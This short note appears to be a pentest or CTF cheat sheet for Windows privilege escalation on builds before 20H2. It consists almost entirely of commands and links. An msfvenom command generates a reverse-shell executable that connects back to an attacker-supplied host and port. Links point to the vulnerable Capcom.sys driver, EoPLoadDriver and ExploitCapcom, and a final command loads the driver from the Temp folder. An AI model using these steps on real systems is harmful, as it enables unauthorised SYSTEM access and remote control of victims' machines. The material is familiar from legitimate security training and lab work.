version < Windows 10 20H2 (Build 19042)

reverse shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f exe -o rev.exe
```

Capcom.sys

```
https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
```

download eoploaddriver.cpp

```
https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp
```

```
C:\Users\<user>\source\repos\eoploaddriver\x64\Release
```

download ExploitCapcom

```
https://github.com/tandasat/ExploitCapcom
```

```
C:\Windows\Temp\wineoploaddriver.exe System\CurrentControlSet\dfserv C:\Windows\Temp\Capcom.sys
```